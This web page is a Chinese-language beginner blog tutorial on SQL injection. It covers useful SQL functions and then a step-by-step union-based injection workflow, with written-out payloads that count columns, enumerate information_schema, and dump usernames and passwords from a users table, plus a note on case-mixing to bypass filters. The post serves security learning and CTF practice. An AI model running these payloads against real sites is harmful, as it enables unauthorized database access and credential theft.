<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.126.1"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="sql注入初探"><meta itemprop=description content="集中一点,登峰造极"><meta name=description content="集中一点,登峰造极"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://zp9080.github.io/imgs/author.png"><meta itemprop=keywords content="SQL注入"><meta property="og:type" content="article"><meta property="og:title" content="sql注入初探"><meta property="og:description" content="集中一点,登峰造极"><meta property="og:image" content="/imgs/author.png"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://zp9080.github.io/post/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/"><meta property="og:site_name" content="f1ow-blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="f1ow"><meta property="article:published_time" content="2024-10-20 09:26:35 +0800 CST"><meta property="article:modified_time" content="2024-10-20 09:26:35 +0800 CST"><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/font-awesome/6.6.0/css/all.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/animate.css/4.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href=/css/main.min.bfbac3431de920c11b5b1cafa45029ea1bc93d5d3da50fed4ab6924b4c250360.css><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script class=next-config data-name=page type=application/json>{"comments":false,"isHome":false,"isPage":true,"path":"sql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2","permalink":"https://zp9080.github.io/post/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/","title":"sql注入初探","waline":{"js":[{"alias":"@waline/client","alias_name":"waline","file":"dist/pageview.js","name":"pageview","version":"2.15.8"},{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}]}}</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>sql注入初探 - f1ow-blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><div class=overlay></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>f1ow-blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>集中一点,登峰造极</p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
<span class=badge>207</span></a></li><li class="menu-item menu-item-categories"><a href=/categories/ class=hvr-icon-pulse rel=section><i class="fa fa-categories hvr-icon"></i>分类</a></li><li class="menu-item menu-item-tags"><a href=/tags/ class=hvr-icon-pulse rel=section><i class="fa fa-tags hvr-icon"></i>标签</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#sql常见函数>sql常见函数</a><ul><li><a href=#concat>CONCAT</a></li><li><a href=#substr>SUBSTR</a></li><li><a href=#group_concat>GROUP_CONCAT</a></li></ul></li><li><a href=#sql中一些常见查询语句>sql中一些常见查询语句</a></li><li><a href=#sql注入流程>sql注入流程</a><ul><li><a href=#判断是字符型还是数字型>判断是字符型还是数字型</a></li><li><a href=#猜解sql查询语句中的字段数>猜解sql查询语句中的字段数</a></li><li><a href=#确定字段的显示顺序>确定字段的显示顺序</a></li><li><a href=#获取当前数据库>获取当前数据库</a></li><li><a href=#获取数据库中的表>获取数据库中的表</a></li><li><a href=#获取表中的字段名>获取表中的字段名</a></li><li><a href=#下载数据>下载数据</a></li></ul></li><li><a href=#一些经验>一些经验</a></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=f1ow src=/imgs/img-lazy-loading.gif data-src=/imgs/author.png><p class=site-author-name itemprop=name>f1ow</p><div class=site-description itemprop=description>集中一点,登峰造极</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>207</span>
<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>38</span>
<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>80</span>
<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/zp9080 title="Github → https://github.com/zp9080" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
Github</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://v3rdant.cn/ title=https://v3rdant.cn/ target=_blank>v3rdant</a></li><li class=links-of-blogroll-item><a href=https://juicymio.github.io/ title=https://juicymio.github.io/ target=_blank>juicymio</a></li><li class=links-of-blogroll-item><a href=https://ka7arotto.github.io/ title=https://ka7arotto.github.io/ target=_blank>Goku</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate=2024-07-28T00:00:00+00:00></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=273686></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=660></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate=2025-02-27T17:57:37+08:00></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/zp9080 rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://zp9080.github.io/post/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/author.png"><meta itemprop=name content="f1ow"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="f1ow"><meta itemprop=description content="集中一点,登峰造极"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="sql注入初探"><meta itemprop=description content></span><header class=post-header><h1 class=post-title itemprop="name headline">sql注入初探
<a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/post/SQL%e6%b3%a8%e5%85%a5/sql%e6%b3%a8%e5%85%a5%e5%88%9d%e6%8e%a2.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=编辑><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2024-10-20 09:26:35 +0800 CST" itemprop="dateCreated datePublished" datetime="2024-10-20 09:26:35 +0800 CST">2024-10-20
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/sql%E6%B3%A8%E5%85%A5 itemprop=url rel=index><span itemprop=name>WEB/SQL注入</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
</span><span class=post-meta-item-text>字数：</span>
<span>2004</span>
</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
</span><span class=post-meta-item-text>阅读：&ap;</span>
<span>4分钟</span>
</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=busuanzi_value_page_pv data-path=/post/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><p>[TOC]</p><h1 id=sql常见函数>sql常见函数
<a class=header-anchor href=#sql%e5%b8%b8%e8%a7%81%e5%87%bd%e6%95%b0></a></h1><h2 id=concat>CONCAT
<a class=header-anchor href=#concat></a></h2><ul><li>CONCAT：字符串拼接,用于将两个或多个字符串连接起来，返回一个组合后的新字符串。</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-sql data-lang=sql><span style=display:flex><span>CONCAT(string1,<span style=color:#bbb> </span>string2,<span style=color:#bbb> </span>...,<span style=color:#bbb> </span>stringN)<span style=color:#bbb>
</span></span></span></code></pre></div><h2 id=substr>SUBSTR
<a class=header-anchor href=#substr></a></h2><ul><li>SUBSTR / SUBSTRING：提取子字符串,用于从一个字符串中提取子字符串。</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-sql data-lang=sql><span style=display:flex><span>SUBSTR(string,<span style=color:#bbb> </span>start_position,<span style=color:#bbb> </span><span style=color:#a2f;font-weight:700>length</span>)<span style=color:#bbb>
</span></span></span></code></pre></div><p>string：要操作的字符串。
start_position：开始提取的起始位置（1 表示字符串的第一个字符）。
length：可选，表示要提取的字符数量。如果省略，则提取到字符串的末尾。
示例：</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#a2f;font-weight:700>SELECT</span><span style=color:#bbb> </span>SUBSTR(<span style=color:#b44>&#39;Hello World&#39;</span>,<span style=color:#bbb> </span><span style=color:#666>7</span>,<span style=color:#bbb> </span><span style=color:#666>5</span>)<span style=color:#bbb> </span><span style=color:#a2f;font-weight:700>AS</span><span style=color:#bbb> </span><span style=color:#a2f;font-weight:700>substring</span>;<span style=color:#bbb>
</span></span></span></code></pre></div><p>结果：</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#a2f;font-weight:700>substring</span><span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb></span><span style=color:#080;font-style:italic>---------
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>World<span style=color:#bbb>
</span></span></span></code></pre></div><p>这个例子从 Hello World 的第 7 个字符开始提取，长度为 5 个字符，即提取出 World。</p><h2 id=group_concat>GROUP_CONCAT
<a class=header-anchor href=#group_concat></a></h2><p>GROUP_CONCAT 是 SQL 中的一个聚合函数，常用于将分组的结果集中的多个值连接成一个字符串。它会将分组后的多行数据合并为一行，并以指定的分隔符连接起来，通常与 GROUP BY 子句一起使用。</p><p>作用：将一组值（通常是来自同一个分组的多个行）连接成一个字符串，并用指定的分隔符分隔这些值。</p><ul><li>语法</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-sql data-lang=sql><span style=display:flex><span>GROUP_CONCAT([<span style=color:#a2f;font-weight:700>DISTINCT</span>]<span style=color:#bbb> </span>expression<span style=color:#bbb> </span>[<span style=color:#a2f;font-weight:700>ORDER</span><span style=color:#bbb> </span><span style=color:#a2f;font-weight:700>BY</span><span style=color:#bbb> </span>expression<span style=color:#bbb> </span><span style=color:#a2f;font-weight:700>ASC</span><span style=color:#666>|</span><span style=color:#a2f;font-weight:700>DESC</span>]<span style=color:#bbb> </span>[SEPARATOR<span style=color:#bbb> </span><span style=color:#b44>&#39;separator&#39;</span>])<span style=color:#bbb>
</span></span></span></code></pre></div><p>DISTINCT：可选，用于去重。
expression：要连接的字段或表达式。
ORDER BY：可选，用于指定连接结果的排序方式。
SEPARATOR：可选，指定连接时使用的分隔符，默认为逗号（,）。</p><ul><li>示例用法
简单使用 GROUP_CONCAT,假设有一个 students 表，包含 class 和 name 字段：</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#a2f;font-weight:700>SELECT</span><span style=color:#bbb> </span><span style=color:#a2f;font-weight:700>class</span>,<span style=color:#bbb> </span>GROUP_CONCAT(name)<span style=color:#bbb> </span><span style=color:#a2f;font-weight:700>AS</span><span style=color:#bbb> </span>student_names<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb></span><span style=color:#a2f;font-weight:700>FROM</span><span style=color:#bbb> </span>students<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb></span><span style=color:#a2f;font-weight:700>GROUP</span><span style=color:#bbb> </span><span style=color:#a2f;font-weight:700>BY</span><span style=color:#bbb> </span><span style=color:#a2f;font-weight:700>class</span>;<span style=color:#bbb>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#a2f;font-weight:700>class</span><span style=color:#bbb>    </span>student_names<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb></span><span style=color:#080;font-style:italic>-------  -------------------
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span><span style=color:#666>1</span><span style=color:#bbb>        </span>Alice,Bob,Charlie<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb></span><span style=color:#666>2</span><span style=color:#bbb>        </span>David,Eve,Frank<span style=color:#bbb>
</span></span></span></code></pre></div><p>在这个例子中，GROUP_CONCAT 将每个班级中的学生姓名用逗号连接起来。</p><h1 id=sql中一些常见查询语句>sql中一些常见查询语句
<a class=header-anchor href=#sql%e4%b8%ad%e4%b8%80%e4%ba%9b%e5%b8%b8%e8%a7%81%e6%9f%a5%e8%af%a2%e8%af%ad%e5%8f%a5></a></h1><p>select 1,2,3 可以直接查看所有列的数据</p><p>#表示单行注释 &ndash;+表示注释 但是常用&ndash;+,因为#不会自动变成url编码</p><h1 id=sql注入流程>sql注入流程
<a class=header-anchor href=#sql%e6%b3%a8%e5%85%a5%e6%b5%81%e7%a8%8b></a></h1><p><a href=https://blog.csdn.net/A951860555/article/details/116484328 title=参考文章 rel="noopener external nofollow noreferrer" target=_blank class=exturl>参考文章
<i class="fa fa-external-link-alt"></i></a></p><h2 id=判断是字符型还是数字型>判断是字符型还是数字型
<a class=header-anchor href=#%e5%88%a4%e6%96%ad%e6%98%af%e5%ad%97%e7%ac%a6%e5%9e%8b%e8%bf%98%e6%98%af%e6%95%b0%e5%ad%97%e5%9e%8b></a></h2><p>判断注入类型，数字型还是字符型：</p><p>首先，我们需要确定目标是数字型还是字符型注入漏洞，以便我们进一步进行其它注入操作。如下面的php代码片段所示，第一行代码代表数字型的sql拼接，其中的变量在sql查询语句拼接时并没有用引号括起来；第二行代码是字符型，其中的变量使用了引号进行拼接。</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span># 数字型
</span></span><span style=display:flex><span>$query = &#34;SELECT first_name, last_name FROM users WHERE user_id = $id;&#34;;
</span></span><span style=display:flex><span># 字符型
</span></span><span style=display:flex><span>$query = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;;
</span></span></code></pre></div><p>对于字符型注入判断，我们也可以这样进行操作，如下面的两条注入语句所示，<strong>如果是在数字型注入中，由于变量没有加引号，所以拼接后sql语法错误，直接报错，这和不回显信息是有区别</strong>。因此如果下面的语句注入后提示sql语法错误，那么我们可以直接判断测试对象为数字型注入。<strong>而对于字符型注入，第一行语句输入后和原本的引号前后完全闭合，且逻辑成立，所以回显出user_id为1的数据；第二行语句输入后，前后引号也完全闭合，但逻辑不成立，所以返回结果为空。</strong></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>1&#39; --+    这种方式我最喜欢用
</span></span><span style=display:flex><span>1&#39; And 1=1 --+ 一般直接的and很容易被过滤，所以经常要大小写绕过
</span></span></code></pre></div><h2 id=猜解sql查询语句中的字段数>猜解sql查询语句中的字段数
<a class=header-anchor href=#%e7%8c%9c%e8%a7%a3sql%e6%9f%a5%e8%af%a2%e8%af%ad%e5%8f%a5%e4%b8%ad%e7%9a%84%e5%ad%97%e6%ae%b5%e6%95%b0></a></h2><p>在这一步中，我们尝试去猜测出查询语句中的字段个数，如下注入语句所示，假设为字符型注入，<strong>先利用1&rsquo;实现引号闭环，再利用or 1=1这样可以暴露出表中所有的数据，最后利用order by num#去看是否报错来明确查询语句中的字段数，其中#号用于截断sql查询语句。</strong></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>1&#39; Or 1=1 ORDER by 1 --+
</span></span><span style=display:flex><span>1&#39; Or 1=1 oRder by 2 --+
</span></span><span style=display:flex><span>1&#39; Or 1=1 oRder by 3 --+
</span></span><span style=display:flex><span>...直到试出没有回显的
</span></span></code></pre></div><h2 id=确定字段的显示顺序>确定字段的显示顺序
<a class=header-anchor href=#%e7%a1%ae%e5%ae%9a%e5%ad%97%e6%ae%b5%e7%9a%84%e6%98%be%e7%a4%ba%e9%a1%ba%e5%ba%8f></a></h2><p>这里我们直接使用union就行 1&rsquo; union select 1, 2 &ndash;+</p><h2 id=获取当前数据库>获取当前数据库
<a class=header-anchor href=#%e8%8e%b7%e5%8f%96%e5%bd%93%e5%89%8d%e6%95%b0%e6%8d%ae%e5%ba%93></a></h2><p>通过前面的字段数确定以及显示顺序确定，我们就可以<strong>结合union操作来获取数据库中的信息了</strong>。如下代码和截图所示，展示了获取数据库名的操作，根据前面已经获取到的字段数以及位置关系，假设有两个字段，那么下面的查询语句将会把数据库的名称放在第二个字段中。</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>1&#39; union select 1,database() --+
</span></span></code></pre></div><h2 id=获取数据库中的表>获取数据库中的表
<a class=header-anchor href=#%e8%8e%b7%e5%8f%96%e6%95%b0%e6%8d%ae%e5%ba%93%e4%b8%ad%e7%9a%84%e8%a1%a8></a></h2><p>在获取到当前数据库名后，我们可以进一步获取其中表的信息。如下代码和截图所示，展示了获取数据库中表的信息，information_schema是MySql自带的信息数据库，用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等，其中的表实际上都是视图。<strong>information_schema的tables表记录了数据库中表的信息，指定table_schema的名称即可显示对应数据库中表的信息。</strong></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>1&#39; union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() --+
</span></span></code></pre></div><h2 id=获取表中的字段名>获取表中的字段名
<a class=header-anchor href=#%e8%8e%b7%e5%8f%96%e8%a1%a8%e4%b8%ad%e7%9a%84%e5%ad%97%e6%ae%b5%e5%90%8d></a></h2><p>进一步获取其中的字段名，假设要获取的表为users，如下面的代码和截图所示。information_schema的columns表存储了表中列的信息，也就是表中字段信息，指定table_name表名，即可获取到对应表的字段信息。</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>1&#39; union select 1, group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+
</span></span></code></pre></div><h2 id=下载数据>下载数据
<a class=header-anchor href=#%e4%b8%8b%e8%bd%bd%e6%95%b0%e6%8d%ae></a></h2><p> 最后根据需要，我们获取表中的信息。这里需要注意的是，我们假设<strong>原来的注入语句中只有两个查询字段，所以这里select后也只能跟两个group_concat，想一次性看多余的信息，只能在一个group_concat中进行组合。</strong></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>1&#39; or 1=1 union select group_concat(user_id, first_name, last_name), group_concat(password) from users --+
</span></span></code></pre></div><h1 id=一些经验>一些经验
<a class=header-anchor href=#%e4%b8%80%e4%ba%9b%e7%bb%8f%e9%aa%8c></a></h1><ul><li>看到别人做题的时候，select时的列数最好是和字段数一致，比如字段数为4，那么就select database(),2,3,4这种，不要select database(),1这种</li></ul></div><footer class=post-footer><div class=post-tags><a href=/tags/sql%e6%b3%a8%e5%85%a5>SQL注入</a></div><div class=addthis_inline_share_toolbox style=text-align:center></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>请我喝杯咖啡吧 ヾ(^▽^*)))</div><button>
赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.png alt="f1ow - 支付宝">
<span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.png alt="f1ow - 微信">
<span>微信</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg width=75 height=75 align=right alt=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
sql注入初探</li><li class=post-copyright-author><strong>本文作者： </strong>f1ow</li><li class=post-copyright-link><strong>本文链接：</strong>
<a id=post-cr-link href=https://zp9080.github.io/post/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/ title=sql注入初探>https://zp9080.github.io/post/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/php/php%E8%AF%AD%E6%B3%95%E7%89%B9%E6%80%A7/ rel=next title=php语法特性><i class="fa fa-chevron-left"></i> php语法特性</a></div><div class="post-nav-prev post-nav-item"><a href=/post/%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/ rel=prev title="春秋云境 Initial">春秋云境 Initial
<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
<span itemprop=copyrightYear>2024 - 2025
</span><span class=with-love><i class="fa fa-heart"></i>
</span><span class=author itemprop=copyrightHolder>f1ow</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.126.1 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.6.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div><div class=beian><a href=https://beian.miit.gov.cn target=_blank>鄂ICP备 20240001号</a>
<img src=/imgs/gongan.png alt=鄂公网安备>
<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42010002002000" target=_blank>鄂公网安备 42010002002000 号</a></div><div class=vendors-list><a target=_blank href=https://vercel.com title=Vercel><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/vercel.svg alt=Vercel>
</a><a target=_blank href=https://upyun.com title=又拍云><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/upyun.png alt=又拍云>
</a><a target=_blank href=https://github.com title=Github><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/github.svg alt=Github>
